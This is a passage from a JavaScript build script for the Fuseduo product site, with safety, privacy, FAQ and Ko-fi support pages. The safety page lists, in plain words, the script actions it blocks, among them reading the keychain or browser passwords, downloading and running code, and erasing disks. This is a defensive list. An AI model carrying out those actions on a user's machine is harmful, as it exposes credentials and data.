  <div class="section-head" data-reveal><p class="eyebrow"><span class="pip"></span>The block-list</p><h2>Some things it simply won’t run.</h2><p class="lede">On top of Claude’s own rules, every script is screened before the Run button is enabled. If it matches any of these, it’s blocked.</p></div>
  <div class="blocklist" data-reveal>
    <span>Deleting files or folders</span><span>Moving things to the Trash</span><span>Emptying the Trash</span><span>Administrator rights (sudo)</span><span>Sending email or messages for you</span><span>Downloading and running code</span><span>Changing system settings</span><span>Erasing disks</span><span>Restarting or shutting down</span><span>Reading the keychain</span><span>Reading browser passwords or cookies</span><span>Changing file permissions</span>
  </div>
  <p class="small center" style="margin-top:22px" data-reveal>It’s a safety net, not a sandbox. Reading the plan before you approve is still the main protection.</p>
</div></section>

<section class="section tight"><div class="wrap">
  <div class="section-head" data-reveal><p class="eyebrow"><span class="pip"></span>Privacy</p><h2>What Claude sees.</h2></div>
  <div class="sent">
    <div class="card yes" data-reveal><h3>Sent to Claude</h3><ul><li>The names of the two apps you fused</li><li>The idea you picked, or the one you typed</li><li>If a script fails to compile, the script and the error, so it can be fixed</li></ul></div>
    <div class="card no" data-reveal style="--d:.08s"><h3>Never sent</h3><ul><li>Your notes, emails, events, photos or files</li><li>What a script reads or makes when it runs</li><li>A list of all your apps</li><li>Analytics or tracking of any kind</li></ul></div>
  </div>
</div></section>

<section class="section tight"><div class="wrap narrow">
  <div class="section-head" data-reveal><h2>Questions</h2></div>
  <div class="faq" data-reveal>
    <details><summary>Can a fusion delete my stuff?</summary><p>Fuseduo asks Claude never to delete, overwrite or move your files, and blocks scripts that try to delete things, move them to the Trash or empty it. Fusions create new things instead.</p></details>
    <details><summary>Can it send emails or messages as me?</summary><p>No. It can open a draft for you to check, but scripts that send email or messages are blocked.</p></details>
    <details><summary>Why does macOS ask for permission?</summary><p>macOS asks the first time any app wants to control another app, like Notes or Calendar. That prompt comes from macOS itself. You can change it later in System Settings › Privacy &amp; Security › Automation.</p></details>
    <details><summary>Do I need to pay for an API key?</summary><p>Not if you have Claude Code. Fuseduo can use your own Claude Code sign-in, and requests count towards your plan’s limits. If you’d rather, use an Anthropic API key instead. You choose in Settings, and Fuseduo never sees your Claude login.</p></details>
    <details><summary>Is there a Windows version?</summary><p>Not yet. Fuseduo starts on Mac. Windows (with PowerShell) is planned.</p></details>
  </div>
</div></section>
${notify}`,
});

/* ---------- support (Ko-fi) ---------- */
const KOFI = 'https://ko-fi.com/hollowbit';
const kofiIcon = '<svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" stroke="none" d="M4 6.5h12.5v6.2a5.3 5.3 0 0 1-5.3 5.3H9.3A5.3 5.3 0 0 1 4 12.7V6.5Zm12.5 1.5h1.3a3 3 0 0 1 0 6h-1.5c.1-.4.2-.9.2-1.3V8Zm0 2v2.5h1.3a1.25 1.25 0 0 0 0-2.5h-1.3Zm-6.4 6.1 2.9-2.8a1.7 1.7 0 0 0-2.3-2.5l-.6.5-.6-.5a1.7 1.7 0 0 0-2.3 2.5l2.9 2.8Z"/></svg>';
const support = page({
  path: 'support/',
  title: 'Support Fuseduo · Ko-fi',
  desc: 'Fuseduo is an independent project by Hollowbit Studio. A one-off tip on Ko-fi helps get it signed, polished and out the door.',
  body: `<section class="page-head"><div class="wrap narrow">
  <p class="eyebrow"><span class="pip"></span>Support</p>
  <h1 class="words" style="font-size:clamp(40px,6vw,72px)">${words('Help Fuseduo')} <span class="grad-text">${words('ship.')}</span></h1>
  <p class="lede" data-reveal style="--d:.4s">Fuseduo is an independent project from Hollowbit Studio, with no investors and no ads. If you’d like it to exist, a one-off tip on Ko-fi goes straight into getting it finished.</p>
</div></section>

<section class="section tight"><div class="wrap narrow">
  <div class="kofi-card" data-reveal>
    <div class="core kofi-core"><span class="halo"></span><span class="pulse"></span><span class="pulse p2"></span><img src="${BASE}assets/img/icon-256.png" alt="" width="150" height="150"></div>
    <h2>Buy the build a coffee.</h2>
    <p class="lede">Any amount, once. Ko-fi handles the payment and you don’t need an account.</p>
    <div class="cta"><a class="btn btn-kofi big" href="${KOFI}" target="_blank" rel="noopener">${kofiIcon}Support on Ko-fi</a></div>
    <p class="small" style="margin-top:16px">Opens ko-fi.com/hollowbit in a new tab.</p>
  </div>
</div></section>

<section class="section tight"><div class="wrap">
  <div class="section-head" data-reveal><p class="eyebrow"><span class="pip"></span>Where it goes</p><h2>What your tip pays for.</h2></div>
  <div class="grid3">
    ${card('shield', 'A signed, notarised app', 'An Apple Developer membership, so Fuseduo opens without macOS warning you it’s from an unknown developer.')}
    ${card('bolt', 'Testing with Claude', 'Every idea and script is tested against real Claude calls, across lots of app pairs, before it ships.', 0.08)}
    ${card('mac', 'Windows next', 'Time to bring fusions to Windows with PowerShell, after the Mac version is out.', 0.16)}
  </div>
  <p class="small center" style="margin-top:26px" data-reveal>Can’t tip? Sharing Fuseduo with one person who’d love it helps just as much.</p>
  <div class="cta" data-reveal><a class="btn btn-glass" href="${BASE}#download">Download Fuseduo</a><a class="btn btn-glass" href="${HB}/donate/">Support all Hollowbit tools</a></div>
</div></section>`,
});

// The site lives at fuseduo.com; the old hollowbit.dev/fuseduo/ pages just send people there.
const redirect = (p) => `<!doctype html><meta charset="utf-8"><title>Fuseduo</title><link rel="canonical" href="https://fuseduo.com/${p}"><meta name="robots" content="noindex"><meta http-equiv="refresh" content="0; url=https://fuseduo.com/${p}"><script>location.replace('https://fuseduo.com/${p}' + location.hash)</script><a href="https://fuseduo.com/${p}">Fuseduo has moved to fuseduo.com</a>`;
const out = (p, html) => { const f = resolve(OUTDIR, p, 'index.html'); mkdirSync(dirname(f), { recursive: true }); writeFileSync(f, DOMAIN ? html : redirect(p ? p + '/' : '')); };
out('', home); out('how-it-works', how); out('safety', safety); out('support', support);
const today = new Date().toISOString().slice(0, 10);
writeFileSync(resolve(OUTDIR, 'sitemap.xml'), `<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
${['', 'how-it-works/', 'safety/', 'support/'].map((p) => `  <url><loc>${ORIGIN}${BASE}${p}</loc><lastmod>${today}</lastmod></url>`).join('\n')}
</urlset>
`);
if (DOMAIN) { // a standalone site: its own copy of the assets, the domain, robots and a 404
  rmSync(resolve(OUTDIR, 'assets'), { recursive: true, force: true });
  cpSync(resolve(root, 'fuseduo/assets'), resolve(OUTDIR, 'assets'), { recursive: true });
  writeFileSync(resolve(OUTDIR, 'CNAME'), 'fuseduo.com\n');
  writeFileSync(resolve(OUTDIR, '.nojekyll'), '');
  writeFileSync(resolve(OUTDIR, 'robots.txt'), 'User-agent: *\nAllow: /\nSitemap: https://fuseduo.com/sitemap.xml\n');
  writeFileSync(resolve(OUTDIR, '404.html'), page({ path: '', title: 'Not found · Fuseduo', desc: 'This page doesn’t exist.', body: `<section class="page-head"><div class="wrap narrow"><h1 style="font-size:64px">Nothing here.</h1><p class="lede">That page doesn’t exist. <a href="/">Go to Fuseduo</a>.</p></div></section>` }));
}
console.log(`fuseduo (${DOMAIN ? 'fuseduo.com' : 'hollowbit.dev/fuseduo'}): 4 pages + sitemap | downloads ${DL.version}`);
